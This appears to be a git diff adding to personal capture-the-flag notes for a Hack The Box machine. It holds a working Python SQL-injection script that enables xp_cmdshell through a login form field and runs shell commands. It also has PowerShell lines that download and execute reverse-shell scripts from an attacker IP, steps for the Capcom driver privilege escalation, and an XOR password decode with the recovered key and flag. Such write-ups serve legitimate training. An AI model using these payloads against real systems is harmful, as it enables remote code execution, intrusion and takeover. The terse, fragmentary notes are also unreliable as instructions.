@@ -90,3 +90,156 @@ username=admin&password=asdfasdf&logintype=1+union+select+1,2,3,4,(SELECT+CONVER
 remember <span style=color:red> xp_cmdshell to xP_CmDsHeLl </span>
 
 that is good!
+
+
+
+####  execute command by python3
+
+this is a import thing, <span style=color:red> cmd = cmd.replace("'", "''")</span>
+
+1; insert into test (output) exec xP_CmDsHeLl 'c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell  IEX(new-object net.webclient).downloadString(''http://10.10.14.27/rv-9000.ps1'')';-- -
+
+~~~python
+#!/usr/bin/python3
+
+import requests
+import urllib.parse
+import base64
+
+class Fighter(object):
+
+```
+def __init__(self):
+    self.url = "http://members.streetfighterclub.htb/old/verify.asp"
+    self.proxies = "http://127.0.0.1:8080"
+
+    self.enablecmd= '''1;exec sp_configure 'show advanced options',1;\
+            reconfigure;\
+            exec sp_configure 'xP_CmDsHeLl', 1;\
+            reconfigure;\
+            '''
+    self.createtable = '''1; create table test(ID int identity(1,1) primary key, output varchar(1024));\
+    '''
+
+    self.truncate = '''1;truncate table test;\
+    '''
+```
+
+```
+    self.getcount = '''1 union select 1,2,3,4,(select top 1 ID  from test order by ID desc),6-- -\
+    '''
+    self.session =  requests.session()
+    self.session.get(self.url)
+
+    self.post(self.enablecmd)
+    self.post(self.createtable)
+
+def post(self, payload):
+
+    proxies = {'http' : self.proxies}
+
+    #enquote = urllib.parse.quote(payload);
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'logintype': payload,
+        'rememberme': 'ON',
+        'B1': 'LogIn'
+    }
+
+    return self.session.post(self.url, proxies=proxies, data=data, allow_redirects=False)
+
+def runcmd(self, cmd):
+
+    self.post(self.truncate)
+
+    cmd = cmd.replace("'", "''")
+    payload = f"1; insert into test (output) exec xP_CmDsHeLl '{cmd}';-- -"
+
+    self.post(payload)
+
+    r  =  self.post(self.getcount)
+    count = int(self.decode(r.cookies))
+
+    for i in range(0, count):
+        id = i + 1;
+        op = '1 union select 1,2,3,4,(select top 1 output from test where ID = %d),6-- -' %id
+        try:
+            r = self.post(op)
+            print(self.decode(r.cookies).decode('utf-8'))
+        except:
+            pass
+
+def decode(self,cookies):
+    return base64.b64decode(urllib.parse.unquote(cookies['Email']))
+```
+
+o = Fighter()
+
+while True:
+    cmd = input(">")
+    o.runcmd(cmd)
+~~~
+
+#### revershell 
+
+```powershell
+c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell  IEX(new-object net.webclient).downloadString('http://10.10.14.27/rv-443.ps1')
+```
+
+#### truncate  <span style=color:red> access mode file </span>
+
+// [system.io.file]::open('file', [system.io.filemode]::truncate)
+
+cmd /c "type c:\users\sqlserv\task >> c:\users\decoder\clean.bat"
+
+get the reverse shell
+
+
+
+###  Catcom moudle exploit
+
+cmd /c "driverquery"
+
+Module Name  Display Name           Driver Type   Link Date
+============ ====================== ============= ======================
+
+Capcom       Capcom                 Kernel        05/09/2016 08:43:33
+
+http://www.fuzzysecurity.com/tutorials/28.html
+
+https://github.com/FuzzySecurity/Capcom-Rootkit
+
+for i in $(find . -name "*.ps1" ); do (cat $i &&  echo ) >> a.txt; done
+
+PS C:\users> IEX(new-object net.webclient).downloadString('http://10.10.14.27/capcom.ps1')
+
+PS C:\users> capcom-elevatepid
+
+## ida-free
+
+new-instance->load root.ext -> view->opensubview->strings(shift+f12)->"string passwd"->select "rdata:0040211C"(ctrl + x) --> call    ds:check
+
+
+
+new-install ->load check checkdll.dll ->  view->opensubview->strings(shift+f12)->
+
+->
+
+loc_10001010:
+mov     cl, byte ptr ds:aFmFeholH[edx+eax] ; "Fm`fEhOl}h"
+xor     cl, 9
+cmp     cl, byte ptr ds:aFmFeholH[eax] ; "Fm`fEhOl}h"
+
+
+
+## get the real pass key
+
+```python
+enpasswd = 'Fm`fEhOl}h'
+for i in enpasswd:
+    print(chr(ord(i)^9),end='')
+```
+
+PS C:\users\administrator\desktop> c:\users\administrator\desktop\root.exe OdioLaFeta
+d801c1e9bd9a02f8fb30d8bd3be314c1
